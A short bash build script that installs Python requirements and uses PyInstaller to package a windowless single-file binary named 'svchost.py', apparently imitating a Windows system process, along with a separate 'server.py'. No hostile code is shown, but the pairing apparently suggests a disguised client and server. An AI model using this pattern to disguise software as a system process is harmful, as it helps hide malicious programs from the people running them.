#!/bin/bash
set -e

if ! command -v python3 &> /dev/null; then
    echo "Python3 not found"
    exit 1
fi

pip install -r requirements.txt
mkdir -p dist

pyinstaller --onefile --noconsole --distpath dist svchost.py
pyinstaller --onefile --distpath dist server.py

echo "Build complete. Binaries in dist/"